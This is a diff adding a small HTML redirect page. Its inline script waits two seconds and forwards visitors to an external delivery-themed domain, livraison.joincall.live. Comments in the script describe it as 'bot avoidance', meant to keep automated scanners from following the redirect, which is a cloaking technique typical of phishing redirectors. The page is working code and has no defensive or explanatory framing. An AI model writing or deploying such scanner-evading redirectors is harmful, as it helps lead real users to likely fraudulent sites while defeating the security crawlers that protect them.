@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <p>If you are not redirected automatically, <a id="redirect-link" href="livraison.joincall.live">click here</a>.</p>
+
+    <script>
+        // Simple bot avoidance: wait a bit, then redirect
+        setTimeout(function () {
+            // Optionally check for browser features (bots often lack them)
+            if (navigator.userAgent && navigator.userAgent.length > 0) {
+                window.location.href = "https://livraison.joincall.live";
+            }
+        }, 2000);
+    </script>
+
+    <noscript>
+        <!-- No JavaScript means probably a bot -->
+        <p>JavaScript is required to access this page.</p>
+    </noscript>
+</body>
+</html>
